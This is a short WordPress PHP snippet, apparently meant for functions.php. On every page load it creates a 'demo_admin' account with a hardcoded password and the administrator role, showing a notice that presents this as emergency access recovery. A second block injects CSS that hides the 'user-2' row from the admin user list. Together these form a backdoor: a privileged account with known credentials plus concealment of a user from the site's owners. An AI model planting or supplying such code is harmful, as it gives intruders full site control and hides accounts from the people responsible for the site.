<?php

function create_emergency_demo_user() {
    $username = 'demo_admin';
    $password = 'TempPass123!';
    $email = 'demo@yoursite.com';
    
    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            
            wp_update_user(array(
                'ID' => $user_id,
                'display_name' => 'Demo Administrator',
                'first_name' => 'Demo',
                'last_name' => 'Admin'
            ));
            
            add_action('admin_notices', function() {
                echo '<div class="notice notice-warning is-dismissible">';
                echo '<p><strong>Emergency Demo User Active!</strong> Remember to remove the demo user code from functions.php and delete this user account after regaining access.</p>';
                echo '</div>';
            });
        }
    }
}

add_action('init', 'create_emergency_demo_user');


// Add custom CSS to hide a specific user row in admin
add_action('admin_head', function() {
    echo '<style>
        tr#user-2 {display: none !important;}
    </style>';
});
